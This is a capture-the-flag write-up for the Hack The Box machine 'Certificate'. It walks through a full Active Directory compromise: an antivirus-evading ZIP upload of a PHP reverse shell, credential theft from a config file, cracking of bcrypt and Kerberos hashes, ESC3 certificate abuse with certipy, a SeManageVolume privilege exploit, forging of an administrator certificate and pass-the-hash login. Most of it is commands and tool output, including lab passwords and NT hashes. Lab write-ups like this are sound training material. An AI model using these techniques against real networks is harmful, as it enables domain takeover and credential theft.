---
title: "Hack The Box — Certificate"
date: 2025-12-30
categories: [HTB, Active Directory]
tags: [htb, ad, adcs, kerberos, esc3, privilege-escalation]
---

![Image description](/assets/images/image.png)

## Nmap

```sh
➜  Certificate nmap 10.10.11.71 -Pn -sC -sV
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-14 02:33 EDT
Stats: 0:01:49 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.94% done; ETC: 02:35 (0:00:00 remaining)
Stats: 0:02:06 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.94% done; ETC: 02:35 (0:00:00 remaining)
Nmap scan report for 10.10.11.71
Host is up (0.41s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
|_http-title: Did not follow redirect to http://certificate.htb/
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-14 14:33:54Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-14T14:35:18+00:00; +7h59m49s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-14T14:35:17+00:00; +7h59m49s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-14T14:35:18+00:00; +7h59m49s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
|_ssl-date: 2025-07-14T14:35:17+00:00; +7h59m49s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Hosts: certificate.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-07-14T14:34:41
|_  start_date: N/A
|_clock-skew: mean: 7h59m48s, deviation: 0s, median: 7h59m48s
```

## Port  80 (Apache httpd 2.4.58 )

![Image description](/assets/images/image2.png)

Not much interest.  
We enrolled in the course, where we had to submit a quiz.

We could upload a ZIP file, but we had to evade Windows Antivirus.

![Image description](/assets/images/image-1.png)

I created a PHP web shell and embedded it into a ZIP payload in a way that could evade Windows Antivirus detection.
I created two separate ZIP files:
 **Head ZIP** containing a legitimate PDF file:
 ```sh
   ➜  tt zip head.zip sample-local-pdf.pdf
  adding: sample-local-pdf.pdf (deflated 6%)
   ```

**Tail ZIP** containing the directory with the PHP shell:
```sh
➜  tt zip tail.zip tmp
  adding: tmp/ (stored 0%)
```

what in tmp folder

```sh
➜  tt ls tmp/
shell.php
```
   i used  [pentestmonkey](https://pentestmonkey.net/tools/web-shells/php-reverse-shell)
then, I combined both ZIP files into a single payload ZIP:
```sh
➜  tt zip payload.zip head.zip tail.zip
  adding: head.zip (stored 0%)
  adding: tail.zip (stored 0%)
```

now we had a shell 
![Image description](/assets/images/image-2.png)

there is file called db.php
```php
<?php
// Database connection using PDO
try {
    $dsn = 'mysql:host=localhost;dbname=Certificate_WEBAPP_DB;charset=utf8mb4';
    $db_user = 'certificate_webapp_user'; // Change to your DB username
    $db_passwd = 'cert!f!c@teDBPWD'; // Change to your DB password
    $options = [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    ];
    $pdo = new PDO($dsn, $db_user, $db_passwd, $options);
} catch (PDOException $e) {
    die('Database connection failed: ' . $e->getMessage());
}
?>
```
now we have a cerds so mysql.exe to look
```sh
C:\xampp\mysql\bin>.\mysql.exe -u certificate_webapp_user -p"cert!f!c@teDBPWD" -e "show databases;"
Database
certificate_webapp_db
information_schema
test

C:\xampp\mysql\bin>.\mysql.exe -u certificate_webapp_user -p"cert!f!c@teDBPWD" -e "use certificate_webapp_db; show tables;"
Tables_in_certificate_webapp_db
course_sessions
courses
users
users_courses

C:\xampp\mysql\bin>.\mysql.exe -u certificate_webapp_user -p"cert!f!c@teDBPWD" -e "use certificate_webapp_db; select * from users;;"
```

There are a lot of users in the search query, here you can follow this Sara.B, because she exists in the user directory

```sh
➜  ~ john hash.txt --wordlist=~/hashcat/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 16 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Blink182         (?)     
1g 0:00:00:00 DONE (2025-06-01 09:02) 1.818g/s 22254p/s 22254c/s 22254C/s monday1..vallejo
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

```sh
➜  ~ evil-winrm -i 10.10.11.71 -u Sara.B -p 'Blink182'                         
```
now can perform BloodHound
```sh
bloodhound-python -u Sara.B -p 'Blink182'  -d Certificate.htb -ns 10.10.11.71 -c All --zip
```
while look around in the cli there's pcap file and txt file 
![Image description](/assets/images/image-3.png)
i download the pcap file and open in wireshark
![Image description](/assets/images/image-4.png)
it has some  Kerberos protocol
there's tool called [Krb5RoastParser](https://github.com/jalvarezz13/Krb5RoastParser	)
## What is **Krb5RoastParser**?

**Krb5RoastParser** is a tool designed to parse Kerberos authentication packets (AS-REQ, AS-REP and TGS-REP) from `.pcap` files and generate password-cracking-compatible hashes for security testing. By leveraging `tshark`, Krb5RoastParser extracts necessary details from Kerberos packets, providing hash formats ready for tools like Hashcat.

```sh
➜  Krb5RoastParser git:(main) ✗ python krb5_roast_parser.py ../WS-01_PktMon.pcap as_req >>hash.txt
➜  Krb5RoastParser git:(main) ✗ cat hash.txt
$krb5pa$18$Lion.SK$CERTIFICATE.HTB$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0


➜  hashcat hashcat -m 19900 certificate.txt rockyou.txt --show
$krb5pa$18$Lion.SK$CERTIFICATE.HTB$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0:!QAZ2wsx
```
now we have onther cerds 
Lion.SK:!QAZ2wsx

```sh
evil-winrm -i 10.10.11.71 -u Lion.sk -p '!QAZ2wsx'
```

now let's look the bloodHound data 

![Image description](/assets/images/image-5.png)

i mark the user Lion.sk
there are some certificate i just run certfify with cerds Lion.sk 
```sh
➜  ~ certipy find  -u lion.sk -p '!QAZ2wsx' -dc-ip 10.10.11.71 -vulnerable
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 35 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 18 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'Certificate-LTD-CA' via RRP
[*] Successfully retrieved CA configuration for 'Certificate-LTD-CA'
[*] Checking web enrollment for CA 'Certificate-LTD-CA' @ 'DC01.certificate.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20250913120051_Certipy.txt'
[*] Wrote text output to '20250913120051_Certipy.txt'
[*] Saving JSON output to '20250913120051_Certipy.json'
[*] Wrote JSON output to '20250913120051_Certipy.json'
```

```sh
➜  ~ cat 20250913120051_Certipy.txt
Certificate Authorities
  0
    CA Name                             : Certificate-LTD-CA
    DNS Name                            : DC01.certificate.htb
    Certificate Subject                 : CN=Certificate-LTD-CA, DC=certificate, DC=htb
    Certificate Serial Number           : 75B2F4BBF31F108945147B466131BDCA
    Certificate Validity Start          : 2024-11-03 22:55:09+00:00
    Certificate Validity End            : 2034-11-03 23:05:09+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : CERTIFICATE.HTB\Administrators
      Access Rights
        ManageCa                        : CERTIFICATE.HTB\Administrators
                                          CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        ManageCertificates              : CERTIFICATE.HTB\Administrators
                                          CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Enroll                          : CERTIFICATE.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : Delegated-CRA
    Display Name                        : Delegated-CRA
    Certificate Authorities             : Certificate-LTD-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectAltRequireEmail
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-05T19:52:09+00:00
    Template Last Modified              : 2024-11-05T19:52:10+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFICATE.HTB\Domain CRA Managers
                                          CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFICATE.HTB\Administrator
        Full Control Principals         : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Owner Principals          : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Dacl Principals           : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Property Enroll           : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
    [+] User Enrollable Principals      : CERTIFICATE.HTB\Domain CRA Managers
    [!] Vulnerabilities
      ESC3                              : Template has Certificate Request Agent EKU set.
```
 it vulnerable to [ESC3](https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-4/)vist this web site the black hill cover lot and good explain as well

```sh
➜  ~ certipy req -u 'lion.sk@CERTIFICATE.HTB' -p "\!QAZ2wsx" -dc-ip '10.10.11.71' -target 'DC01.CERTIFICATE.HTB' -ca 'Certificate-LTD-CA' -template 'Delegated-CRA'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 29
[*] Successfully requested certificate
[*] Got certificate with UPN 'Lion.SK@certificate.htb'
[*] Certificate object SID is 'S-1-5-21-515537669-4223687196-3249690583-1115'
[*] Saving certificate and private key to 'lion.sk.pfx'
[*] Wrote certificate and private key to 'lion.sk.pfx'
```

```sh
➜  ~  certipy req -u 'lion.sk@CERTIFICATE.HTB' -p "\!QAZ2wsx" -dc-ip '10.10.11.71' -target 'DC01.CERTIFICATE.HTB' -ca 'Certificate-LTD-CA' -template 'SignedUser' -pfx 'lion.sk.pfx' -on-behalf-of 'CERTIFICATE\ryan.k'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 30
[*] Successfully requested certificate
[*] Got certificate with UPN 'ryan.k@certificate.htb'
[*] Certificate object SID is 'S-1-5-21-515537669-4223687196-3249690583-1117'
[*] Saving certificate and private key to 'ryan.k.pfx'
[*] Wrote certificate and private key to 'ryan.k.pfx'
```

```sh
➜  ~  certipy auth -pfx 'ryan.k.pfx' -dc-ip '10.10.11.71'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'ryan.k@certificate.htb'
[*]     Security Extension SID: 'S-1-5-21-515537669-4223687196-3249690583-1117'
[*] Using principal: 'ryan.k@certificate.htb'
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
[-] Use -debug to print a stacktrace
[-] See the wiki for more information
➜  ~ ntpdate -s 10.10.11.71
➜  ~ certipy-ad req -u 'lion.sk@CERTIFICATE.HTB' -p '\!QAZ2wsx' -dc-ip '10.10.11.71' -target 'DC01.CERTIFICATE.HTB' -ca 'Certificate-LTD-CA' -template 'Delegated-CRA' -on-behalf-of 'CERTIFICATE\\administrator' -pfx lion.sk.pfx -debug

➜  ~  certipy auth -pfx 'ryan.k.pfx' -dc-ip '10.10.11.71'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'ryan.k@certificate.htb'
[*]     Security Extension SID: 'S-1-5-21-515537669-4223687196-3249690583-1117'
[*] Using principal: 'ryan.k@certificate.htb'
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
[-] Use -debug to print a stacktrace
[-] See the wiki for more information
➜  ~ sudo ntpdate -u 10.10.11.71

[sudo] password for kali:
2025-09-13 20:46:40.686757 (-0400) +28799.697707 +/- 0.229999 10.10.11.71 s1 no-leap
CLOCK: time stepped by 28799.697707
➜  ~  certipy auth -pfx 'ryan.k.pfx' -dc-ip '10.10.11.71'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'ryan.k@certificate.htb'
[*]     Security Extension SID: 'S-1-5-21-515537669-4223687196-3249690583-1117'
[*] Using principal: 'ryan.k@certificate.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ryan.k.ccache'
[*] Wrote credential cache to 'ryan.k.ccache'
[*] Trying to retrieve NT hash for 'ryan.k'
[*] Got hash for 'ryan.k@certificate.htb': aad3b435b51404eeaad3b435b51404ee:b1bc3d70e70f4f36b1509a65ae1a2ae6
```

now we have hash for the user ryan.k

```sh
➜  ~ evil-winrm -i 10.10.11.71 -u 'ryan.k' -H b1bc3d70e70f4f36b1509a65ae1a2ae6

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Ryan.K\Documents>

*Evil-WinRM* PS C:\Users\Ryan.K\Documents> ./winPEASx86.exe
Program 'winPEASx86.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1
+ ./winPEASx86.exe
+ ~~~~~~~~~~~~~~~~.
At line:1 char:1
+ ./winPEASx86.exe
+ ~~~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
```
we can't run winpease
```sh
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                      State
============================= ================================ =======
SeMachineAccountPrivilege     Add workstations to domain       Enabled
SeChangeNotifyPrivilege       Bypass traverse checking         Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set   Enabled
```

## Privilege Abuse: `SeChangeNotifyPrivilege`

During local privilege enumeration, the user was found to have the **SeChangeNotifyPrivilege** enabled.
the exploit i was i used from [xct](https://github.com/xct/SeManageVolumeAbuse)

```powershell
*Evil-WinRM* PS C:\Users\Ryan.k> .\SeManageVolumeExploit.exe
Entries changed: 859

DONE

*Evil-WinRM* PS C:\Users\Ryan.k> icacls C:/windows
C:/windows NT SERVICE\TrustedInstaller:(F)
           NT SERVICE\TrustedInstaller:(CI)(IO)(F)
           NT AUTHORITY\SYSTEM:(M)
           NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
           BUILTIN\Users:(M)
           BUILTIN\Users:(OI)(CI)(IO)(F)
           BUILTIN\Pre-Windows 2000 Compatible Access:(RX)
           BUILTIN\Pre-Windows 2000 Compatible Access:(OI)(CI)(IO)(GR,GE)
           CREATOR OWNER:(OI)(CI)(IO)(F)
           APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(RX)
           APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)
           APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(RX)
           APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)

Successfully processed 1 files; Failed processing 0 files
```

now we call access but we can't read it 
```sh
certutil -exportpfx 75B2F4BBF31F108945147B466131BDCA .\admin.pfx
```
then download admin.pfx 

```sh
certipy forge -ca-pfx admin.pfx -upn Administrator@certificate.htb -subject 'CN=ADMINISTRATOR,CN=USERS,DC=CERTIFICATE,DC=HTB'

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Saving forged certificate and private key to 'administrator_forged.pfx'
[*] Wrote forged certificate and private key to 'administrator_forged.pfx'
```

```sh
certipy-ad auth -pfx administrator_forged.pfx -dc-ip 10.10.11.71
Certipy v5.0.3 - by Oliver Lyak (ly4k)	

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@certificate.htb'
[*] Using principal: 'administrator@certificate.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certificate.htb': aad3b435b51404eeaad3b435b51404ee:d804304519bf0143c14cbf1c024408c6
```
## root
```sh
evil-winrm -i 10.10.11.71 -u 'administrator' -H d804304519bf0143c14cbf1c024408c6
```
now we can read the flag 
i did this bot about month ago
![Image description](/assets/images/image-6.png)
